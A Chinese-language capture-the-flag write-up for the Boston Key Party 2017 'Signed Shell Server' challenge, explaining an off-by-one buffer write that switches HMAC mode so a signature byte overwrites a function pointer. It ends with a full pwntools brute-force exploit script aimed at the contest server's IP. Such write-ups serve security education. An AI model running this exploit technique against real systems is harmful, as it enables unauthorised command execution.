# Boston Key Party 2017: Signed Shell Server (Pwn, 200)

說明：
> I'll only execute shell commands that are authenticated with my hmac-sha1 key. I'll sign a few benign commands for you, but after that, you're on your own!
>
> [sss](sss)

## 解題

接入題目伺服器後，看到兩個選項：1)產生特定指令的簽署；2)執行指令。

```
Welcome to Secure Signed Shell
1) sign command
2) execute command
>_ 1
what command do you want to sign?
>_ ls
signature:
0fcc9e22ff4cec3f5afbaf5906dba086
```

選項(1)執行名為`sign_it()`的function，它可以簽署`ls`、`pwd`、`whoami`或`id`指令。程式可以用MD5或SHA1的HMAC產生簽署，從以上的輸出可以看到伺服器預設是使用MD5。選項(2)會執行`execute_it()`，它會執行擁有正確簽署的指令。

### Out-of-bounds錯誤

程式裡有一個global variable用來設定用MD5還是SHA1，我們稱之為`use_md5`。另外有一個256 byte的array（`buf`）用來暫存輸入的指令，而它的剛好在`use_md5`的前面。

```c
i = read(0, &buf, 256);
buf[i] = 0x0;
```

在`sign_it()`和`execute_it()`裡有這一段程式碼用來輸入指令。若輸入長度為256字元，就會超出`buf`的容量而把`use_md5`改寫為`0x0`。

## Exploit

```c
int execute_it() {
    if (*exec_guy == 0x0) {
            *exec_guy = calloc(36, 1);
            *s_exec_guy = *exec_guy;
            *m_exec_guy = *exec_guy + 0x1;
            *(*s_exec_guy + 0x14) = deny_command;
            *(*s_exec_guy + 0x1c) = exec_command;
    }
    use_md5 = sign_extend_64(*(int8_t *)use_md5 & 0xff);
    exec_guy = *m_exec_guy;
    if (use_md5 == 0x0) {
            exec_guy = *s_exec_guy;
    }
    puts("what command do you want to run?");
    printf(">_ ");
    *(int8_t *)(sign_extend_32(read(0x0, buf, 256)) + 0x602140) = 0x0;
    if ((*(int8_t *)use_md5 & 0xff) != 0x0) {
            hmac = HMAC(EVP_md5(), *key, strlen(*key), buf, strlen(buf), 0x0, hmac_len);
    }
    else {
            hmac = HMAC(EVP_sha1(), *key, strlen(*key), buf, strlen(buf), 0x0, hmac_len);
    }
    memcpy(exec_guy, hmac, hmac_len);
    ...
```

`execute_it()`的開頭有一段程式碼用來設定兩個function pointer，一個是用來在簽署不正確時拒絕執行指令（`deny_command`, `0x00400d36`），另一個則執行簽署正確的指令（`exec_command`, `0x00400d5b`）。在拒絕執行指令的function pointer之前還有一個buffer儲存指令的正確簽署。若`use_md5`的值為`0`，這個buffer的長度會是20 byte，否則會設為19 byte。

若果我們用上面提到的out-of-bounds錯誤更改`use_md5`的值，就可以令`execute_it()`用SHA1產生簽署，SHA1簽署的最後1 byte就會覆寫`deny_command` function pointer的least significant byte，只要把它改為`0x5b`就可以指向`exec_command`執行任意的指令（例如`cat flag`）。可是，我們並沒有HMAC的密鑰，所以只能夠brute-force嘗試不同的長度為256字元的隨機輸入，直至找到一個HMAC-SHA1最後1 byte是`0x5b`的指令。

## 完整解答

[sss.py](sss.py)

```python
from pwn import *
import sys

host = "54.202.7.144"
port = 9875

context(log_level='info')

stopword = "FLAG="
cmd = "echo -n '{}';cat flag; #".format(stopword)
for i in range(255):
    for j in range(3):
        try:
            r = remote(host, port)
            r.recvuntil(">_ ")
            r.sendline("2")
            r.recvuntil(">_ ")
            r.sendline(cmd + chr(i) * (255 - len(cmd)))
            r.recvuntil(">_ ")
            r.sendline("00")
            s = r.recvuntil(stopword, timeout=1)
            if s == "" or s.startswith("wrong signature") or s.startswith("echo"):
                raise EOFError()
            s = r.recvline()
            print "Flag is {}".format(s)
            exit()
        except EOFError:
            r.close()
            print "Next #{}".format(i)
            break
        except PwnlibException:
            r.close()
            print "Retry #{}".format(i)
            continue
```

## Flag

```
bkp{and you did not even have to break sha1}
```